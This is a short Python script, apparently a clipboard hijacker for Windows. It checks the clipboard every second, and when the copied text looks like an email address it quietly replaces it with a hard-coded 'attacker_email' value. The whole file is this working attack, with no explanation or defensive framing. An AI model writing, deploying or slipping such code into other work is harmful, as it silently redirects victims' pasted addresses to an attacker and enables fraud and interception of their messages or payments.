import win32clipboard
import re
from time import sleep

attacker_email = "abcd@xyz.com"
email_regex = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'

while True:
    win32clipboard.OpenClipboard()
    try:
        data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
        data = data.decode("utf-8")
        if re.match(email_regex, data):
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(attacker_email)
            break
    except TypeError:
        pass
    finally:
        win32clipboard.CloseClipboard()
    sleep(1)

print("Email replaced or loop stopped.")
